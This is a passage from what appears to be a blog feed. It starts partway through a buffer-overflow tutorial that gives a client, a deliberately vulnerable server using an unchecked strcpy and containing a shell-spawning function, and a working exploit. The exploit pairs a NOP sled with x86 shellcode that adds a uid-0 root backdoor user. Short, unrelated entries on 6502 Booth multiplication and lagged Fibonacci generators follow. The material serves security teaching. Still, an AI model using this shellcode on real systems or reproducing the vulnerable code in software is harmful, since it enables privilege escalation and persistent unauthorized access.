        <span class="o">*</span><span class="p">(</span><span class="n">tmp</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>

    <span class="n">buff</span><span class="p">[</span><span class="n">buffs</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// Off-by-one byte</span>

    <span class="n">calctmp</span><span class="p">(</span><span class="n">buff</span><span class="p">);</span>

    <span class="cm">/*
    printf("%s", buff);
    fflush(stdout);
    */</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure> <h2 id="example-for-a-server-with-a-buffer-overflow-vulnerability">Example for a Server with a Buffer Overflow Vulnerability</h2> <h3 id="clientc">client.c</h3> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;netinet/in.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;netdb.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;arpa/inet.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>

<span class="cp">#define PORT 7777
#define BUF_SIZE 1024
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
	<span class="kt">int</span> <span class="n">sock</span><span class="p">,</span> <span class="n">run</span><span class="p">,</span> <span class="n">r</span><span class="p">;</span>
	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUF_SIZE</span><span class="p">];</span>
	<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">server</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">hostent</span> <span class="o">*</span><span class="n">hp</span><span class="p">;</span>
	<span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"usage: client &lt;hostname&gt; </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="cm">/* create socket */</span>
	<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">sock</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">"open stream socket"</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">server</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>

	<span class="cm">/* get internet address of host specified by command line */</span>
	<span class="n">hp</span> <span class="o">=</span> <span class="n">gethostbyname</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">hp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">"%s unknown host.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="cm">/* copies the internet address to server address */</span>
	<span class="n">bcopy</span><span class="p">(</span><span class="n">hp</span><span class="o">-&gt;</span><span class="n">h_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">server</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">,</span> <span class="n">hp</span><span class="o">-&gt;</span><span class="n">h_length</span><span class="p">);</span>

	<span class="cm">/* set port */</span>
	<span class="n">server</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>

	<span class="cm">/* open connection */</span>
	<span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="o">&amp;</span><span class="n">server</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">"connecting stream socket"</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="cm">/* read input from stdin */</span>
	<span class="k">while</span><span class="p">(</span><span class="n">run</span><span class="o">=</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">BUF_SIZE</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"%s"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
		<span class="k">if</span><span class="p">(</span><span class="n">run</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="n">perror</span><span class="p">(</span><span class="s">"error reading from stdin"</span><span class="p">);</span>
			<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
		<span class="p">}</span>
		
		<span class="cm">/* write buffer to stream socket */</span>
		<span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">run</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="n">perror</span><span class="p">(</span><span class="s">"writing on stream socket"</span><span class="p">);</span>
			<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure> <h3 id="serverc">server.c</h3> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;netinet/in.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;arpa/inet.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="cp">#define LISTENQ 1024
#define SA struct sockaddr
#define PORT 7777
</span>
<span class="kt">void</span> <span class="nf">fc</span><span class="p">()</span> <span class="p">{</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/bin/sh"</span><span class="p">;</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
   <span class="n">execve</span><span class="p">(</span><span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">name</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">calc</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
	<span class="n">strcpy</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
	<span class="n">buff</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">buff</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">text</span><span class="p">[</span><span class="mi">1024</span><span class="p">],</span> <span class="n">ed</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
	<span class="kt">int</span> <span class="n">listenfd</span><span class="p">,</span> <span class="n">connfd</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">serveraddr</span><span class="p">;</span>
	<span class="kt">ssize_t</span> <span class="n">n</span><span class="p">;</span>

	<span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">)</span>
		<span class="n">calc</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

	<span class="n">listenfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

	<span class="n">bzero</span><span class="p">(</span><span class="o">&amp;</span><span class="n">serveraddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serveraddr</span><span class="p">));</span>
	<span class="n">serveraddr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
	<span class="n">serveraddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">htonl</span> <span class="p">(</span><span class="n">INADDR_ANY</span><span class="p">);</span>
	<span class="n">serveraddr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span> <span class="p">(</span><span class="n">PORT</span><span class="p">);</span>

	<span class="n">bind</span><span class="p">(</span><span class="n">listenfd</span><span class="p">,</span> <span class="p">(</span><span class="n">SA</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">serveraddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serveraddr</span><span class="p">));</span>

	<span class="n">listen</span><span class="p">(</span><span class="n">listenfd</span><span class="p">,</span> <span class="n">LISTENQ</span><span class="p">);</span>
	<span class="k">for</span><span class="p">(</span> <span class="p">;</span> <span class="p">;)</span> <span class="p">{</span>

		<span class="n">connfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">listenfd</span><span class="p">,</span> <span class="p">(</span><span class="n">SA</span> <span class="o">*</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

		<span class="k">do</span> <span class="p">{</span>
			<span class="n">write</span><span class="p">(</span><span class="n">connfd</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">Eingabe:</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
			<span class="n">n</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">connfd</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">text</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
			<span class="n">text</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

			<span class="n">calc</span><span class="p">(</span><span class="n">text</span><span class="p">);</span>
			<span class="n">write</span><span class="p">(</span><span class="n">connfd</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">Gedreht:</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
			<span class="n">write</span><span class="p">(</span><span class="n">connfd</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">text</span><span class="p">));</span>

			<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">%d</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="n">text</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
			<span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="n">text</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'!'</span><span class="p">);</span>

		<span class="n">close</span><span class="p">(</span><span class="n">connfd</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure> <h3 id="exploitc">exploit.c</h3> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/errno.h&gt;</span><span class="cp">
</span>
<span class="cp">#define DEFAULT_OFFSET  500
#define DEFAULT_BUFFER  600
#define NOP             0x90
</span>
<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
    <span class="s">"</span><span class="se">\xeb\x67\x5e\x89\x76\x4c\x8d\x46</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x12\x89\x46\x50\x8d\x46\x15\x89</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x46\x54\x8d\x46\x17\x89\x46\x58</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x8d\x46\x1a\x89\x46\x5c\x8d\x46</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x1d\x89\x46\x60\x8d\x46\x22\x89</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x46\x64\x8d\x46\x25\x89\x46\x68</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x8d\x46\x48\x89\x46\x6c\x31\xc0</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x88\x46\x11\x88\x46\x14\x88\x46</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x16\x88\x46\x19\x88\x46\x1c\x88</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x46\x21\x88\x46\x24\x88\x46\x47</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x88\x46\x4b\x89\x46\x70\xb0\x0b</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x89\xf3\x8d\x4e\x4c\x8d\x56\x70</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xcd\x80\x31\xdb\x89\xd8\x40\xcd</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x80\xe8\x94\xff\xff\xff\x2f\x75</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x73\x72\x2f\x73\x62\x69\x6e\x2f</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x61\x64\x64\x75\x73\x65\x72\x23</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x2d\x75\x23\x30\x23\x2d\x6f\x23</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x2d\x67\x23\x72\x6f\x6f\x74\x23</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x2d\x70\x23\x24\x31\x24\x37\xcf</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x76\xd9\x4c\x4b\xcf\xb5\x24\x67</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x53\x55\x4b\x47\x36\x52\x41\x4c</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x7a\x52\x41\x38\x72\x79\x52\x4f</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x63\x54\x73\x47\x30\x23\x72\x75</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x74\x23</span><span class="s">"</span><span class="p">;</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">getESP</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">__asm__</span><span class="p">(</span><span class="s">"movl %esp,%eax"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">calc</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">bb</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">bb</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
    <span class="n">i</span> <span class="o">=</span> <span class="n">j</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">DEFAULT_OFFSET</span><span class="p">,</span> <span class="n">buffs</span> <span class="o">=</span> <span class="n">DEFAULT_BUFFER</span><span class="p">,</span> <span class="n">i</span><span class="p">;</span>
    <span class="kt">long</span> <span class="n">adr</span><span class="p">,</span> <span class="o">*</span><span class="n">adr_pointer</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">offset</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">)</span>
        <span class="n">buffs</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>

    <span class="n">buff</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">buffs</span><span class="p">);</span>    <span class="c1">// Reserve memory on the heap</span>

    <span class="n">adr</span> <span class="o">=</span> <span class="n">getESP</span><span class="p">()</span> <span class="o">-</span> <span class="n">offset</span><span class="p">;</span>
    <span class="n">tmp</span> <span class="o">=</span> <span class="n">buff</span><span class="p">;</span>
    <span class="n">adr_pointer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span><span class="o">*</span><span class="p">)</span> <span class="n">tmp</span><span class="p">;</span>

    <span class="c1">// Fill the entire buffer with the guessed address</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">buffs</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">)</span>
        <span class="o">*</span><span class="p">(</span><span class="n">adr_pointer</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">adr</span><span class="p">;</span>

    <span class="c1">// Fill the first half with NOPs</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">buffs</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">buff</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">NOP</span><span class="p">;</span>

    <span class="n">tmp</span> <span class="o">=</span> <span class="n">buff</span> <span class="o">+</span> <span class="p">((</span><span class="n">buffs</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span><span class="p">));</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="o">*</span><span class="p">(</span><span class="n">tmp</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>

    <span class="n">buff</span><span class="p">[</span><span class="n">buffs</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>

    <span class="cm">/*calc(buff);*/</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">buff</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>]]></content><author><name></name></author><summary type="html"><![CDATA[This blog post explores the fundamentals of buffer overflows, including how they arise in C and C++ programs, the role of process memory layout and the x86/IA-32 architecture, and the significance of stack frames. It covers common overflow types — stack-based, off-by-one, BSS, and heap — and shows how attackers use techniques like NOP-sledding to gain elevated privileges. Finally, it illustrates how to craft a working exploit by injecting shellcode into a vulnerable application’s memory space.]]></summary></entry><entry><title type="html">A short Implementation of Booth’s Multiplication Algorithm in 6502 Assembly</title><link href="https://markusthill.github.io/blog/2024/an-efficient-implementation-of-the-booth-algorithm-in-6502-assembler/" rel="alternate" type="text/html" title="A short Implementation of Booth’s Multiplication Algorithm in 6502 Assembly"/><published>2024-12-16T04:16:00+00:00</published><updated>2024-12-16T04:16:00+00:00</updated><id>https://markusthill.github.io/blog/2024/an-efficient-implementation-of-the-booth-algorithm-in-6502-assembler</id><content type="html" xml:base="https://markusthill.github.io/blog/2024/an-efficient-implementation-of-the-booth-algorithm-in-6502-assembler/"><![CDATA[<p>Some time ago, I had to implement a multiplication routine in 6502 assembly for two integer factors, each one byte in size, using Booth’s multiplication algorithm. Implementing Booth’s method itself was not particularly tricky. However, it took me some time to come up with a solution that requires only around 40 lines of code.</p> <p>I also found it important to write a routine that tests the multiplication with various predefined combinations of the two factors. The tests included all edge cases, as well as cases where at least one of the factors is zero.</p> <p>The code I ended up with is listed below:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="c1">; A little bit shorter version of the program can be created, when using a temporary variable</span>
<span class="c1">; instead of the X-Register.</span>
<span class="nf">.ORG</span> <span class="kc">$</span><span class="mi">4000</span>
<span class="nl">main:</span>
<span class="nf">CLV</span>
<span class="nf">JSR</span> <span class="nv">bMult</span>	<span class="c1">; Perform multiplication A*B with the booth-method.</span>
<span class="nf">LDA</span> <span class="nv">R</span><span class="o">+</span><span class="mi">1</span>		<span class="c1">; Load higher-Byte of result to Accumulator.</span>
<span class="nf">LDX</span> <span class="nv">R</span>		<span class="c1">; Load lower-Byte of result to X-Register</span>
<span class="nf">RTS</span>		<span class="c1">; Stop program.</span>


<span class="nl">bMult:</span>	<span class="nf">LDA</span> <span class="nv">A</span>	<span class="c1">; Load first operand.</span>
<span class="nf">BEQ</span> <span class="nv">bMultE</span>	<span class="c1">; stop if first operand is 0.</span>
<span class="nf">STA</span> <span class="nv">R</span>		<span class="c1">; store in lower byte of result. Will be shifted out of it later.</span>
<span class="nf">ASL</span>		<span class="c1">; Determine positions where additions or subtractions have to</span>
<span class="nf">EOR</span> <span class="nv">A</span>		<span class="c1">; be performed by using XOR. For every 1 in the X-Register a</span>
<span class="nf">TAX</span>		<span class="c1">; addition or subtraction has to be performed!</span>
<span class="nf">LDY</span> <span class="err">#</span><span class="mi">8</span>		<span class="c1">; Loop-Counter</span>
<span class="nl">bLoop:</span> <span class="nf">BVS</span> <span class="nv">bOvflw</span> <span class="c1">; If B=$80 we get an overflow for the first subtraction, ignore sign!</span>
<span class="nf">LDA</span> <span class="nv">R</span><span class="o">+</span><span class="mi">1</span>		<span class="c1">; Roll Result to the right. Remember that A is in the lower Byte,</span>
<span class="nf">ASL</span>		<span class="c1">; by shifting the next A-Bit into the carry flag we can determine</span>
<span class="nl">bOvflw:</span>	<span class="nf">ROR</span> <span class="nv">R</span><span class="o">+</span><span class="mi">1</span>	<span class="c1">; later, what operation has to be performed (Addition or subtration);</span>
<span class="nf">ROR</span> <span class="nv">R</span>		<span class="c1">; The Carry-Flag first has to be saved to the stack, because it will</span>
<span class="nf">PHP</span>		<span class="c1">; be changed in the following lines. [*(1)]</span>
<span class="nf">TXA</span>		<span class="c1">; Shift X-Register to the right. By doing this we can check if any</span>
<span class="nf">LSR</span>		<span class="c1">; operation has to be performed (Addition/Subtraction). This is the</span>
<span class="nf">TAX</span>		<span class="c1">; case if the Carry-Flag is equal to 1.</span>
<span class="nf">PLA</span>		<span class="c1">; Restore Status-Register from *(1) to Accumulator.</span>
<span class="nf">BCC</span> <span class="nb">bL</span><span class="nv">oopE</span>	<span class="c1">; Branch if no addition/subtraction has to be done...</span>
<span class="nf">LSR</span>		<span class="c1">; By shifting accumulator we get the old Carry-Flag from (*1).</span>
<span class="nf">LDA</span> <span class="nv">R</span><span class="o">+</span><span class="mi">1</span>		<span class="c1">; Load result</span>
<span class="nf">BCC</span> <span class="nv">bAdd</span>	<span class="c1">; We can now decide if we have to add or subtract. Branch if we add.</span>
<span class="nf">SBC</span> <span class="nv">B</span>		<span class="c1">; Do a subtraction. We do not have to set the Carry-flag explicitly,</span>
<span class="nf">JMP</span> <span class="nv">bCont</span>	<span class="c1">; because we are sure the C-Flag is already set (based on the branch).</span>
<span class="nl">bAdd:</span> <span class="nf">ADC</span> <span class="nv">B</span>	<span class="c1">; Perform an addition. We do not have to reset the Carry-flag		</span>
<span class="nl">bCont:</span> <span class="nf">STA</span> <span class="nv">R</span><span class="o">+</span><span class="mi">1</span>	<span class="c1">; Store result of addition/subtraction.</span>
<span class="nl">bLoopE:</span> <span class="nf">DEY</span>	<span class="c1">; Decrement loop-counter.</span>
<span class="nf">BPL</span> <span class="nb">bL</span><span class="nv">oop</span>       <span class="c1">; Do loop exactly 8 times.</span>
<span class="nl">bMultE:</span> <span class="nf">RTS</span>	<span class="c1">; leave this subroutine. The result is in the variable R.</span>

<span class="nf">.ORG</span> <span class="kc">$</span><span class="mi">4500</span>
<span class="nl">A:</span> <span class="nf">.BYTE</span> <span class="kc">$</span><span class="nv">AA</span>	<span class="c1">; First factor. 1 Byte.</span>
<span class="nl">B:</span> <span class="nf">.BYTE</span> <span class="kc">$</span><span class="mi">81</span>	<span class="c1">; Second factor. 1 Byte.</span>
<span class="nl">R:</span> <span class="nf">.WORD</span> <span class="kc">$</span><span class="mi">0000</span>	<span class="c1">; The result. Needs two bytes.</span></code></pre></figure> <p>In one of the following posts I will describe the ideas behind the Booth method in more detail.</p>]]></content><author><name></name></author><category term="Assembly 6502 Booth Multiplication"/><summary type="html"><![CDATA[I implemented a 6502 assembly routine for multiplying two one-byte integers using Booth's algorithm. While the algorithm itself wasn't difficult to implement, it took time to create a solution that fit within 40 lines of code. I also wrote a test routine to verify the multiplication, covering various predefined combinations, edge cases, and scenarios where one factor is zero.]]></summary></entry><entry><title type="html">Optimizing Lagged Fibonacci Generators for Large-Scale Computations</title><link href="https://markusthill.github.io/blog/2024/lagged-fibo-sequences/" rel="alternate" type="text/html" title="Optimizing Lagged Fibonacci Generators for Large-Scale Computations"/><published>2024-12-16T01:16:00+00:00</published><updated>2024-12-16T01:16:00+00:00</updated><id>https://markusthill.github.io/blog/2024/lagged-fibo-sequences</id><content type="html" xml:base="https://markusthill.github.io/blog/2024/lagged-fibo-sequences/"><![CDATA[<p>Lagged Fibonacci Generators (LFGs) are widely used in simulations and cryptography for generating pseudo-random sequences. While the naive implementation is straightforward, it becomes inefficient for large indices ($n$) due to its iterative nature and growing computational costs.</p> <p>To address these challenges, we introduce an optimized approach using matrix exponentiation and modular arithmetic. By encoding the recurrence relation in a transformation matrix $\mathbf{Q}$, the sequence can be computed efficiently through binary exponentiation. This method scales well, especially with GPU acceleration via libraries like cupy, enabling faster computations for large-scale problems.</p> <p>With a foundation in linear algebra, this approach not only improves runtime but also demonstrates the power of combining mathematical insights with computational techniques for efficient random number generation. Although the approach presented below is already pretty good, it has some shortcomings like large memory requirements. Other approaches such as generating functions, representing the series as the coefficients of a power series, might be advantageous in practice.</p> <p>Follow along in the Jupyter notebook below:</p> <style>.jupyter-child-ext{width:112%;position:relative;left:calc(-10%)}</style> <div class="jupyter-child-ext"> <div class="jupyter-notebook" style="position: relative; width: 100%; margin: 0 auto;"> <div class="jupyter-notebook-iframe-container"> <iframe 